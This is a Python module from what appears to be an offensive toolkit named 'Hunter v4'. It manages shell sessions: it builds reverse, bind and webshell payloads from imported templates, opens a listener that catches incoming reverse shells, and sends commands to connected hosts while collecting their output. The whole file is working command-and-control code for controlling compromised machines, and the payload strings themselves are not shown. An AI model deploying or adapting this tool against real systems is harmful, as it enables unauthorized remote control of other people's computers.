# tools/shell_tool.py
"""Hunter v4 — Shell Manager

Shell session management: reverse shell listener, webshell deployment,
command execution on active shells.
"""

import socket
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from shells.shell_manager import REVERSE_SHELLS, BIND_SHELLS, WEBSHELLS

_sessions: dict[str, dict] = {}
_session_counter = 0


def shell_impl(action: str = "list", session_id: str = "", type: str = "reverse",
               lhost: str = "", lport: int = 4444, shell_type: str = "bash",
               command: str = "") -> dict:
    """Manage shell sessions."""
    global _session_counter

    if action == "generate":
        return _generate_payload(type, lhost, lport, shell_type)
    elif action == "start":
        return _start_listener(lhost, lport)
    elif action == "list":
        return {"sessions": [{"session_id": sid, "type": s["type"], "status": s["status"], "info": s.get("info", "")} for sid, s in _sessions.items()]}
    elif action == "exec":
        if session_id not in _sessions:
            return {"error": f"Session {session_id} not found"}
        return _exec_command(session_id, command)
    elif action == "close":
        if session_id not in _sessions:
            return {"error": f"Session {session_id} not found"}
        _sessions[session_id]["status"] = "closed"
        return {"session_id": session_id, "status": "closed"}
    else:
        return {"error": f"Unknown action: {action}"}


def _generate_payload(type: str, lhost: str, lport: int, shell_type: str) -> dict:
    if type == "reverse":
        if shell_type not in REVERSE_SHELLS:
            return {"error": f"Unknown shell type: {shell_type}. Available: {list(REVERSE_SHELLS.keys())}"}
        payload = REVERSE_SHELLS[shell_type].format(lhost=lhost, lport=lport)
        return {"type": "reverse", "shell_type": shell_type, "payload": payload, "lhost": lhost, "lport": lport}
    elif type == "bind":
        if shell_type not in BIND_SHELLS:
            return {"error": f"Unknown bind shell type: {shell_type}"}
        payload = BIND_SHELLS[shell_type].format(port=lport)
        return {"type": "bind", "shell_type": shell_type, "payload": payload, "port": lport}
    elif type == "webshell":
        if shell_type not in WEBSHELLS:
            return {"error": f"Unknown webshell type: {shell_type}. Available: {list(WEBSHELLS.keys())}"}
        return {"type": "webshell", "shell_type": shell_type, "payload": WEBSHELLS[shell_type]}
    else:
        return {"error": f"Unknown type: {type}. Use: reverse, bind, webshell"}


def _start_listener(lhost: str, lport: int) -> dict:
    global _session_counter
    _session_counter += 1
    session_id = f"shell_{_session_counter:03d}"

    _sessions[session_id] = {"type": "reverse", "status": "listening", "lhost": lhost, "lport": lport, "conn": None, "info": ""}

    def listener_thread():
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((lhost, lport))
            server.settimeout(300)
            server.listen(1)
            conn, addr = server.accept()
            _sessions[session_id]["conn"] = conn
            _sessions[session_id]["status"] = "active"
            _sessions[session_id]["info"] = f"connected from {addr[0]}:{addr[1]}"
            server.close()
        except Exception as e:
            _sessions[session_id]["status"] = "error"
            _sessions[session_id]["info"] = str(e)

    thread = threading.Thread(target=listener_thread, daemon=True)
    thread.start()

    return {"session_id": session_id, "status": "listening", "lhost": lhost, "lport": lport}


def _exec_command(session_id: str, command: str) -> dict:
    session = _sessions.get(session_id)
    if not session or session["status"] != "active":
        return {"error": f"Session {session_id} is not active"}
    conn = session.get("conn")
    if not conn:
        return {"error": "No connection in session"}
    try:
        conn.send(f"{command}\n".encode())
        time.sleep(1)
        output = b""
        conn.settimeout(2)
        while True:
            try:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                output += chunk
            except socket.timeout:
                break
        return {"session_id": session_id, "command": command, "stdout": output.decode("utf-8", errors="ignore"), "stderr": "", "exit_code": 0}
    except Exception as e:
        return {"session_id": session_id, "command": command, "stdout": "", "stderr": str(e), "exit_code": 1}
